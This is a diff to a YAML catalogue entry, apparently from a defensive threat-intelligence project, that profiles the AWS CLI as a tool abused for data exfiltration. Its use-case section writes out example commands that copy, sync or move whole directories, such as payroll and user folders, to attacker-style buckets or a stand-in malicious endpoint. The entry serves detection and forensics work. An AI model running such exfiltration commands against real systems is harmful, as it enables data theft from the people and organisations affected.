@@ -12,14 +12,14 @@ Platform:
 Execution:
   - cli
 Capabilities:
-  - file-transfer #Core AWS CLI function; allows uploading data to S3 using cp, mv, or sync.
-  - authenticated-upload # Supports IAM credentials, role-based access, or tokens (SigV4), tying upload to an identity.
-  - recursive-upload #--recursive enables full directory trees to be uploaded, which is typical in bulk exfiltration.
-  - quiet-execution #--quiet suppresses output; often used to reduce logging or hide exfil behavior in shells/scripts.
-  - endpoint-spoofing #--endpoint-url allows using custom S3-compatible endpoints (e.g., attacker-controlled or S3 Accelerate).
-  - credentialed-access # Requires credentials unless SAS or anonymous access is used; implies elevated access if misused.
-  - anonymous-upload # Can be used with publicly writable buckets or pre-signed URLs with no authentication.
-  - background-execution # AWS CLI can be executed silently by scripts, scheduled tasks, or malware loaders (non-interactive usage).
+  - file-transfer
+  - authenticated-upload
+  - recursive-upload
+  - quiet-execution
+  - endpoint-spoofing
+  - credentialed-access
+  - anonymous-upload
+  - background-execution
 Forensics:
   BinaryLocations:
     - C:\Program Files\Amazon\AWSCLIV2\aws.exe
@@ -34,14 +34,14 @@ Forensics:
   CommandLineArgs:
     Description: These are the most common flags that have been observed to be used by threat actors in the wild.
     Indicators:
-      - s3 cp              # Copies files to S3. Commonly used by ransomware actors for basic exfiltration. [1][2]
-      - s3 mv              # Same as cp, but removes source files after upload. Used for trace reduction. [1]
-      - s3 sync            # Recursively synchronizes local and remote folders; efficient for large bulk exfiltration. [2]
-      - --recursive        # Ensures all nested files/folders are included in exfiltration, including hidden/subdirs. [3]
-      - --quiet            # Suppresses CLI output; reduces terminal evidence or logs in PowerShell history. [2]
-      - --endpoint-url   # Used to specify S3 Transfer Acceleration or attacker-controlled endpoints. Example aws s3 cp myfile.txt https://malicious-domain[.]com --endpoint-url [1]
-      - --exclude          # Allows attacker to skip unnecessary files, avoiding noise or large file sizes. [3]
-      - --include          # Enables targeting of specific file types (e.g., *.pdf, *.docx) for selective exfiltration. [3]"
+      - s3 cp
+      - s3 mv
+      - s3 sync
+      - --recursive
+      - --quiet
+      - --endpoint-url
+      - --exclude
+      - --include
   NetworkArtifacts:
     Description: Detectable traffic patterns related to AWS CLI file transfers.
     Indicators:
@@ -51,60 +51,66 @@ Forensics:
   ConfigFiles:
     - C:\Users\<username>\.aws\credentials
     - ~/.aws/credentials
-  RegistryPersistence: []  # AWS CLI does not natively persist via registry
-  LogFiles: []  # No default log files generated
-  ScheduledTask: []  # The AWS CLI is not scheduled by default unless abused in automation
+  RegistryPersistence: []
+  LogFiles: []
+  ScheduledTask: []
+NetworkBehavior:
+  Description: >
+    AWS CLI performs authenticated HTTPS connections to AWS service endpoints, most commonly Amazon S3,
+    using REST API calls signed with SigV4. During exfiltration abuse, attackers generate sustained outbound
+    HTTPS traffic characterized by large byte counts, recursive object uploads, and optional use of custom
+    or accelerated endpoints to evade domain-based detections.
+  Behaviors:
+    - HTTPS connections to S3 REST API endpoints over port 443
+    - High-volume outbound data transfers during s3 cp or s3 sync operations
+    - Recursive object enumeration followed by sequential uploads
+    - Optional use of s3-accelerate or custom --endpoint-url destinations
+    - Minimal interactive output when --quiet is used
 ThreatActors:
   - ransomware
   - apt
 UseCases:
   - Title: Basic directory exfiltration
-    Description: Copies a full directory to an S3 bucket using the `cp` command with the `--recursive` flag. Common in ransomware and APT campaigns for bulk exfiltration of documents and sensitive files.
+    Description: Copies a full directory to an S3 bucket using the cp command with the --recursive flag.
     Command: aws s3 cp C:\Data s3://exfil-bucket/ --recursive
   - Title: Stealthy exfiltration with quiet mode
-    Description: Executes a recursive file upload while suppressing all CLI output using `--quiet`. This reduces visibility in logs or command history and is often used in script-based or automated exfiltration.
+    Description: Executes a recursive file upload while suppressing all CLI output using --quiet.
     Command: aws s3 cp /tmp/data s3://bucket-name/ --recursive --quiet
   - Title: Exfiltration via custom or accelerated endpoint
-    Description: Uses `--endpoint-url` to redirect uploads through a non-standard endpoint such as S3 Transfer Acceleration or an attacker-controlled S3-compatible service. This can help bypass domain-based detections and increase upload speed.
+    Description: Uses --endpoint-url to redirect uploads through a non-standard endpoint.
     Command: aws s3 cp data.txt https://malicious-s3[.]domain --endpoint-url
   - Title: Selective file exfiltration using filters
-    Description: Uploads only targeted file types (e.g., `.pdf`, `.docx`) using a combination of `--include` and `--exclude` flags. Useful for minimizing upload size and avoiding irrelevant files.
+    Description: Uploads only targeted file types using --include and --exclude flags.
     Command: aws s3 cp /reports s3://leakdump/ --recursive --include "*.pdf" --exclude "*"
   - Title: Trace-removal via move operation
-    Description: Transfers files using the `mv` command, which removes local copies after successful upload. This technique is used to cover tracks and reduce forensic evidence.
+    Description: Transfers files using the mv command, removing local copies after upload.
     Command: aws s3 mv C:\Sensitive s3://hidden-bucket/ --recursive
   - Title: Full backup of compromised system
-    Description: Synchronizes the entire system or user profile directory with a remote S3 bucket using `s3 sync`. This allows attackers to maintain persistence over stolen data even if access is later revoked.
+    Description: Synchronizes the entire user directory with a remote S3 bucket.
     Command: aws s3 sync C:\Users s3://backup-bucket/
   - Title: Obfuscation with benign bucket names
-    Description: Uploads to buckets with non-suspicious names (e.g., `finance-backups`, `system-logs`) to blend in with legitimate activity or evade basic alert rules.
+    Description: Uploads data to non-suspicious bucket names to blend with legitimate activity.
     Command: aws s3 cp C:\Payroll s3://finance-backups/ --recursive
 Detection:
   - Type: Anomalous Endpoint Usage
     Description: >
-      Detect AWS CLI connections to rarely used or non-default S3 endpoints such as `s3-accelerate.amazonaws.com`
-      or custom S3-compatible domains. These may be used to evade standard monitoring or increase upload speed.
+      Detect AWS CLI connections to rarely used or non-default S3 endpoints such as s3-accelerate.amazonaws.com
+      or custom S3-compatible domains.
   - Type: Command-Line Abuse
     Description: >
-      Alert on suspicious use of CLI flags such as `--quiet`, `--recursive`, or combined use of `--include` and `--exclude`,
-      particularly when combined with `mv` (which deletes local files post-upload).
+      Alert on suspicious use of --quiet, --recursive, --include, and --exclude flags, especially with mv.
   - Type: Suspicious Parent Process
     Description: >
-      Detect AWS CLI execution triggered by uncommon parent processes (e.g., `mshta`, `wmic`, `powershell`, `winword`),
-      which may indicate abuse through malware loaders or LOLBINs.
+      Detect AWS CLI execution from uncommon parent processes such as mshta, wmic, powershell, or winword.
   - Type: Credential Misuse + Exfil Behavior
     Description: >
-      Correlate AWS CLI usage with prior credential access events, token use, or suspicious archive creation
-      to detect multi-stage exfiltration workflows.
+      Correlate AWS CLI usage with credential access events or suspicious archive creation.
   - Type: Snapshot Abuse via AWS CLI
     Description: >
-      Monitor for snapshot creation or backup activity linked to credential misuse or suspicious timing.
-      This has been used by ransomware actors for data theft and extortion.
+      Monitor snapshot creation or backup activity linked to credential misuse.
     Sigma: https://github.com/SigmaHQ/sigma/blob/master/rules/cloud/aws/cloudtrail/aws_snapshot_backup_exfiltration.yml
-Testing:
-  - https://hackingthe.cloud/aws/post_exploitation/download_tools_and_exfiltrate_data_with_aws_cli/
 References:
-  - 1. https://thedfirreport.com/2022/10/17/icedid-to-dagon-ransomware/
-  - 2. https://hackingthe.cloud/aws/post_exploitation/download_tools_and_exfiltrate_data_with_aws_cli/
-  - 3. https://docs.aws.amazon.com/cli/latest/reference/s3/
-LastModified: '2025-11-17'
+  - https://thedfirreport.com/2022/10/17/icedid-to-dagon-ransomware/
+  - https://hackingthe.cloud/aws/post_exploitation/download_tools_and_exfiltrate_data_with_aws_cli/
+  - https://docs.aws.amazon.com/cli/latest/reference/s3/
+LastModified: '2025-12-12'
